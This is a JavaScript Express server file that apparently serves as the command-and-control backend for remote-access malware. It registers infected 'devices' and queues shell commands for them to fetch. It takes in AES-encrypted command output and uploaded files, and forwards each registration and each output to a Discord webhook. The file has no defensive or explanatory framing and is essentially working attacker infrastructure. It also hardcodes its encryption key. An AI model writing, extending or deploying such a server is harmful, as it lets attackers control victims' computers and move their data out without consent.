import express from "express";
import bodyParser from "body-parser";
import crypto from "crypto";
import axios from "axios";

const app = express();
app.use(bodyParser.json());

// --- CONFIG (hardcoded) ---
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/your_webhook_here";
const ENCRYPTION_KEY = Buffer.from("_XTLJunX4DlP94U6k--kZ2pm6HrPBXYUjLxKsiFmAWc=", "utf-8"); // must be 32 bytes for AES-256
// ---------------------------

const devices = {};

function decryptData(payload) {
  const obj = JSON.parse(payload);
  const iv = Buffer.from(obj.iv, "base64");
  const encrypted = Buffer.from(obj.data, "base64");
  const decipher = crypto.createDecipheriv("aes-256-cbc", ENCRYPTION_KEY, iv);
  const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
  return decrypted;
}

function encryptData(data) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv("aes-256-cbc", ENCRYPTION_KEY, iv);
  const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
  return JSON.stringify({
    iv: iv.toString("base64"),
    data: encrypted.toString("base64")
  });
}

app.post("/register/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const payload = req.body.payload;
  const info = JSON.parse(decryptData(JSON.stringify(payload)).toString());
  devices[deviceId] = { info, last_cmd: "", last_output: "" };
  await axios.post(DISCORD_WEBHOOK, { content: `🟢 Device ${deviceId} registered: ${JSON.stringify(info)}` });
  res.json({ status: "OK" });
});

app.post("/upload/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const payload = req.body.payload;
  const data = decryptData(JSON.stringify(payload));
  try {
    const text = data.toString("utf-8");
    devices[deviceId].last_output = text;
    await axios.post(DISCORD_WEBHOOK, { content: `📜 Output from ${deviceId}:\n\`\`\`${text.slice(0, 1500)}\`\`\`` });
  } catch {
    await axios.post(DISCORD_WEBHOOK, { content: `📎 Binary file received from ${deviceId}` });
  }
  res.json({ status: "OK" });
});

app.get("/cmd/:deviceId", (req, res) => {
  const { deviceId } = req.params;
  const cmd = devices[deviceId]?.last_cmd || "";
  devices[deviceId].last_cmd = "";
  res.send(encryptData(Buffer.from(cmd, "utf-8")));
});

app.post("/cmd/:deviceId", (req, res) => {
  const { deviceId } = req.params;
  const { cmd } = req.body;
  if (!devices[deviceId]) devices[deviceId] = {};
  devices[deviceId].last_cmd = cmd;
  res.json({ status: "OK" });
});

app.get("/list", (req, res) => {
  res.json(devices);
});

export default app;
